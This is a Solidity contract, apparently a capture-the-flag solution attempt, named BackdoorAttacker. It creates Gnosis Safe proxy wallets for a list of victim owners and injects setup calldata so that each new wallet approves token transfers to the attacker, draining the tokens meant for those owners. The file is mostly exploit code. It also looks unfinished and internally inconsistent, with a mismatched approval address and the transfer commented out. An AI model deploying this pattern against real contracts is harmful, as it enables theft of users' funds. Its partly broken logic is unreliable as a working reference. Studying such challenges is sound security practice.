// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/base/ModuleManager.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

// 1. Call WalletProxyFactory 4x for every owner
//      - Check why fallback manager is being used and exploit in order to retrieve received tokens
contract BackdoorAttacker {

    IERC20 token;
    address singleton;
    IProxyCreationCallback callback;
    GnosisSafeProxyFactory proxyFactory;
    
    constructor (
        address proxyFactory_,
        address token_,
        address singleton_,
        address callback_
    )
    { 
        token = IERC20(token_);
        singleton = singleton_;
        callback = IProxyCreationCallback(callback_);
        proxyFactory = GnosisSafeProxyFactory(proxyFactory_);
    }

    function attack(address[] calldata victums) external {
        bytes memory delegateCalldata = abi.encodeWithSelector(
            ModuleManager.execTransactionFromModule.selector,
            token,
            0,
            abi.encodeWithSelector(IERC20.approve.selector, msg.sender, 10 ether),
            0
        );

        for (uint256 i; i < victums.length;) {
            address[] memory owners = new address[](1);
            owners[0] = victums[i];

            /**
             * Precalculate future proxy contract address so it could be passed to be called via `delegatecall`
             */
            bytes memory initdata = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                token,
                delegateCalldata,
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            GnosisSafeProxy wallet = proxyFactory.createProxyWithCallback(
                singleton,
                initdata,
                i,
                callback
            );

            console.log(token.allowance(address(wallet), address(this)));

            // token.transferFrom(
            //     victums[i],
            //     msg.sender,
            //     10 ether
            // );

            unchecked {
                ++i;
            }
        }
    }
}